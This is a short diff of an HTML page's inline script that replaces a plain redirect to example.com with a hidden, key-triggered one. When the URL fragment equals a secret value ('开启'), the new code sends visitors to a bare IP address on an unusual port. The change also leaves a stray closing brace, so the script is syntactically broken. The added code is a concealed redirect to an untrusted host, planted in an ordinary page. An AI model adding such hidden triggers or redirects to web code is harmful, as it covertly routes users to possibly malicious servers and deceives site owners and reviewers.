@@ -58,9 +58,13 @@
         }
     </style>
     <script>
-        window.onload = function() {
-        console.log("Script is running");
-        window.location.href = "https://example.com";
+        function checkRedirect() {
+        var secretKey = "开启";
+        if (window.location.hash === "#" + secretKey) {
+            window.location.href = "https://24.199.120.10:22887";
+        }
+    }
+    window.onload = checkRedirect;
     }
     </script>
 </head>
